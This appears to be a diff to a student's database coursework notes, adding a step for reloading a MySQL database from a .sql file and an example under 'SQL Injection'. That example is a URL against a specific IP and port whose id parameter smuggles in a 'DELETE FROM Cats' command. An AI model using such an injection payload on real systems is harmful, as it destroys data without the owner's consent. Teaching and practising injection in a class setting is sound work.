@@ -15,3 +15,8 @@
    INSERT INTO project3_partA.Cuteness ('cuteness','cute_level','adjective','seen')VALUES('birb','40','pretty good','5');
    INSERT INTO project3_partA.Cuteness ('cuteness','cute_level','adjective','seen')VALUES('not','0','no way','1');
 6. - 9. On screenshot titled '2017-03-18.png'
+10. in project3_partA.sql
+# Reloading with .sql file
+   mysql -u ____ -p______ [database_name] < project3_partA.sql
+# SQL Injection
+   104.131.47.226:8083/connect.php?id=1%3BDELETE+FROM+Cats
